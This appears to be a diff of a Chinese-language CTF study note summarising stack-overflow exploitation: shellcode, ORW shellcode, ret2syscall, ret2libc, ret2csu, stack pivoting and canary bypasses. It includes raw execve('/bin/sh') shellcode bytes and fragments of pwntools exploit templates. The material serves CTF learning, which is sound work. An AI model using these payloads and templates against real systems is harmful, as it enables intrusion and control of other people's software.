@@ -2,25 +2,25 @@
 
 ## 栈溢出攻击总结
 
-**备注**：陆陆续续也做了不少题目了，但是似乎缺乏一些系统性的总结，特别是在pwn这块，栈溢出的各种技巧有待持续加强。本篇首先总结一下栈溢出的一些方式。同时，也会把攻击脚本记录在这里，以便后续取用。
+**备注**：陆陆续续也做了不少题目了，但是似乎缺乏一些系统性的总结，特别是在`pwn`这块，栈溢出的各种技巧有待持续加强。本篇首先总结一下栈溢出的一些方式。同时，也会把攻击脚本记录在这里，以便后续取用。
 
 ### 1、shellcode
 
-#### 解释
+#### 利用原理
 
 控制程序执行流去执行机器码指令
 
 #### 使用条件
 
-可以控制EIP寄存器，程序关闭了NX保护或者某个可读可写段具有可执行权限。可以结合mprotect函数或者mmap函数执行攻击。
+可以控制`EIP`寄存器，程序关闭了`NX`保护或者某个可读可写段具有可执行权限。可以结合`mprotect`函数或者`mmap`函数执行攻击。
 
-当程序关闭了NX保护，这个时候可以考虑shellcode，shellcode不一定是获取shell，也可以是ORW的shell，即为open(/flag)------read(3, addr, 0x30)------write(1, addr, 0x30)。
+当程序关闭了`NX`保护，这个时候可以考虑`shellcode`，`shellcode`不一定是获取`shell`，也可以是`ORW`的`shellcode`，即为`open(/flag)`------`read(3, addr, 0x30)`------`write(1, addr, 0x30)`。
 
-#### 解题脚本 
+#### 常用脚本 
 
-##### 普通shellcode
+##### 1）普通shellcode
 
-首先记录一些常用的shellcode，分别适用于32位和64位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)
+首先记录一些常用的`shellcode`，分别适用于`32`位和`64`位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)
 
 ```
 shellcode---linux---execve(/bin/sh)
@@ -32,13 +32,13 @@ amd64，长度29字节
 shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
 ```
 
-##### 禁用了system的shellcode
+##### 2）禁用了system的shellcode
 
-这里也放一下orw的shellcode，偶尔会遇到这种题。
+这里也放一下`orw`的`shellcode`，偶尔会遇到这种题。
 
 ```python
 from pwn import *
-# 这里的架构啥的都可以改
+# 这里的架构可以按需更改
 context.update(arch='i386', os='linux', endian='little')
 shellcode = shellcraft.open('/home/orw/flag',0)
 shellcode += shellcraft.read('eax','esp', 0x30)
@@ -82,36 +82,36 @@ int 0x80
 '''
 ```
 
-##### 限制了字符的shellcode
+##### 3）限制了字符的shellcode
 
-比如说，题目对输入的shellcode进行限制，只能输入可打印字符，这个时候，可以利用`alpha3`工具来生成所需要的shellcode，生成的过程为：
+比如说，题目对输入的`shellcode`进行限制，只能输入可打印字符，这个时候，可以利用`alpha3`工具来生成所需要的`shellcode`，生成的过程为：
 
-- 利用pwntools的shellcraft工具生成shellcode，并以字节流的形式保存在文件中
-- 利用alpha3工具，输入命令：`python ALPHA3.py x64 ascii mixedcase rax --input='shellcode' > ../temp/x64_out`这句话的意思是，平台为`x64`，输出可见字符，程序中有`call rax`语句，‘shellcode’是刚刚保存的那个文件，最后生成的内容写入到`x64_out`。需要注意：**alph3安装在python2环境中运行。**
+- 利用`pwntools`的`shellcraft`工具生成`shellcode`，并以字节流的形式保存在文件中
+- 利用`alpha3`工具，输入命令：`python ALPHA3.py x64 ascii mixedcase rax --input='shellcode' > ../temp/x64_out`这句话的意思是，平台为`x64`，输出可见字符，程序中有`call rax`语句，`shellcode`是刚刚保存的那个文件，最后生成的内容写入到`x64_out`。需要注意：**alph3安装在python2环境中运行。**
 
 还有一些其他的利用思路，可以看这篇文章：[shellcode的艺术](https://xz.aliyun.com/t/6645#toc-4)
 
 ### 2、ROP
 
-#### 解释
+#### 利用原理
 
-所谓ROP，全名为return-oriented-program，是一种栈溢出的思想，用来攻击开启了ASLR、Canary、PIE等防护手段的程序，利用各种gadget，或巧妙的栈劫持方式，控制程序执行流，最终获取shell。
+所谓`ROP`，全名为`return-oriented-program`，是一种栈溢出利用的方法，用来攻击开启了`ASLR`、`Canary`、`PIE`等防护手段的程序，利用各种`gadget`，或巧妙的栈劫持方式，控制程序执行流，最终获取`shell`。
 
 #### 使用条件
 
-1. 存在栈溢出，可以获取有效的gadget，或者可以执行系统调用指令
-2. 需要泄露libc加载的基地址或者程序加载的基地址
-3. 能控制EIP指针
+1. 存在栈溢出，可以获取有效的`gadget`，或者可以执行系统调用指令
+2. 需要泄露`libc`加载的基地址或者程序加载的基地址
+3. 能控制`EIP`指针
 
 #### 2.1 ret2func
 
-**使用**：当程序中存在一些后门函数，例如`system(/bin/sh)`或者`open('/flag')`之类的函数，可以将这些函数的地址pop到EIP寄存器，控制程序获取shell或者打印出来flag。
+**使用**：当程序中存在一些后门函数，例如`system(/bin/sh)`或者`open('/flag')`之类的函数，可以将这些函数的地址`pop`到`EIP`寄存器，控制程序获取`shell`或者打印出来`flag`。
 
-此类利用方式较为简单，只需要计算出buffer到函数返回地址的偏移即可。
+此类利用方式较为简单，只需要计算出`buffer`到函数返回地址的偏移即可。
 
 #### 2.2 ret2syscall
 
-**使用**：这里只需要明确概念，然后寻找对应的gadget即可。所谓ret2syscall，就是不直接调用libc函数，而是通过系统调用的方式，来执行相关函数。在i386下执行系统调用为`int 80`指令，amd64为`syscall`的gadget。这里也对传参寄存器进行总结：
+**使用**：这里只需要明确概念，然后寻找对应的`gadget`即可。所谓`ret2syscall`，就是不直接调用`libc`函数，而是通过系统调用的方式，来执行相关函数。在`i386`下执行系统调用为`int 80`指令，`amd64`为`syscall`的`gadget`。这里也对传参寄存器进行总结：
 
 ```
 i386:
@@ -131,12 +131,13 @@ syscall 执行系统调用
 
 **ret2syscall的一些小技巧**：
 
-- 如果找不到对应的64位寄存器的gadget，可以尝试找找32位寄存器的，前提是参数可以只取低地址4个字节，不受高字节的影响。
-- rax/eax会存放函数的返回值，所以，有时候找不到eax相关的gadget可以利用返回值来构造。
-- 很缺gadget的话，可以利用ret2csu完成攻击
+- 如果找不到对应的`64`位寄存器的`gadget`，可以尝试找找`32`位寄存器的，前提是参数可以只取低地址4个字节，不受高字节的影响。比如说，可以不找`pop rax; ret`而去找`pop eax; ret`。
+- `rax/eax`会存放函数的返回值，所以，有时候找不到`eax`相关的`gadget`可以利用返回值来构造。
+- 在`64`位系统下，很缺`gadget`的话，可以利用`ret2csu`完成攻击
 - 有时候缺少写入函数的话，可以利用`lea`或者`mov`指令完成写入。
-- 有时候可以ret2reg，看寄存器有没有存buffer的地址。
-- 还有ret2rsp，配合`jmp rsp`的gadget配合利用。
+- 有时候可以`ret2reg`，看寄存器有没有存`buffer`的地址。
+- 还有`ret2rsp`，配合`jmp rsp`的`gadget`配合利用。
+- 注意除了有`execve`的系统调用，还有`execveat`，因此还有`openat`等，这些以`at`位后缀的系统调用也可以考虑！
 
 再总结一下常用的系统调用号对应函数：
 
@@ -161,7 +162,7 @@ sigreturn	15
 
 #### 2.3 ret2libc
 
-**使用**：程序没有直接给system函数或者execve函数的地址，但是提供了puts、write等函数可以用于泄露函数的地址。构造ROP链来获取shell。
+**使用**：程序没有直接给`system`函数或者`execve`函数的地址，但是提供了`puts`、`write`等函数可以用于泄露函数的地址。构造`ROP`链来获取`shell`。
 
 **攻击模板**：
 
@@ -254,7 +255,7 @@ def ret2libc_pwntools():
 
 #### 2.4 ret2csu
 
-**使用**：这是一个万能的gadget，主要针对amd64架构的程序，一般是程序中找不到`pop rdx  ; ret`的gadget，泄露函数是`write`，写入的函数是`read`，反正是需要传入三个参数。还有一个前提，栈溢出至少需要128个字节，或者更多。
+**使用**：这是一个万能的`gadget`，主要针对`amd64`架构的程序，一般是程序中找不到`pop rdx  ; ret`的`gadget`，泄露函数是`write`，写入的函数是`read`，反正是需要传入三个参数。还有一个前提，栈溢出至少需要`128`个字节，或者更多。
 
 **攻击模板**
 
@@ -290,9 +291,9 @@ def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
 
 #### 2.5 stack pivot attack
 
-**使用**：栈迁移攻击的题目很有特点，需要滿足两个条件：1）可泄露地址或者程序不开启PIE；2）栈溢出超过ebp指针的字节为2个指针大小，刚好只能覆盖到函数返回地址。在32位系统下，溢出ebp指针后8个字节，64位系统下，溢出rbp指针后16个字节。例如在64位系统下，栈变量buffer距离rbp为0x30字节大小，程序可以往buffer最多写入0x40个字节。
+**使用**：栈迁移攻击的题目很有特点，需要滿足两个条件：1）可泄露地址或者程序不开启`PIE`；2）栈溢出超过`ebp`指针的字节为`2`个指针大小，刚好只能覆盖到函数返回地址。在`32`位系统下，溢出`ebp`指针后`8`个字节，`64`位系统下，溢出`rbp`指针后`16`个字节。
 
-**原理**：栈溢出的原理并不复杂，核心是利用`leave;ret`这一个gadget。在64为系统下，该gadget的含义其实包括两条指令：`mov rbp rsp, pop rbp;pop rip`。将`rsp`移动到`rbp`指向的位置，然后`pop rbp`，将栈顶指针指向的内容存入到`rbp`寄存器，然后`rsp `往高地址移动8个字节，再执行`pop rip`，将此时栈顶指针的内容赋给`rip`寄存器，开始执行程序流。
+**原理**：栈溢出的原理并不复杂，核心是利用`leave;ret`这一个`gadget`。在`64`位系统下，该`gadget`的含义其实包括两条指令：`mov rbp rsp, pop rbp;pop rip`。将`rsp`移动到`rbp`指向的位置，然后`pop rbp`，将栈顶指针指向的内容存入到`rbp`寄存器，然后`rsp `往高地址移动`8`个字节，再执行`pop rip`，将此时栈顶指针的内容赋给`rip`寄存器，开始执行程序流。事实上，只需要有`pop rsp; ret`这样的`gadget`就能完成栈迁移。
 
 ```python
 def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
@@ -314,19 +315,45 @@ def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
     payload += p64(leave_ret_addr) # 填充返回地址
     io.send(payload)
     
-    # 之后，程序会取执行rop链
+    # 之后，程序会去执行rop链
 ```
 
 #### 2.6 ret2sigreturn
 
 
 
+#### 2.7 ret2vsdo
+
+
+
+#### 2.8 ret2dl_resolve
+
+
+
 ### 3、绕过Canary
 
-- canary可以检测出程序是否存在栈溢出
-- canary一般就在ebp指针的下方
-- canary是一个随机值，结尾一定是`\x00`
-- 所有子进程、函数的canary都是一样的
+`canary`是一种栈保护手段，一般有以下特点：
+
+- `canary`可以检测出程序是否存在栈溢出
+- `canary`一般就在`ebp`指针的下方
+- `canary`是一个随机值，结尾一定是`\x00`
+- 同一个进程内，所有子进程的所有的函数的`canary`都是一样的
 
 #### 3.1 泄露canary
+
+
+
+#### 3.2 爆破canary
+
+
+
+#### 3.3 利用stack smashing打印flag
+
+
+
+#### 3.4 劫持stack_chk_fail
+
+
+
+#### 3.5 修改TLS段的canary值
 
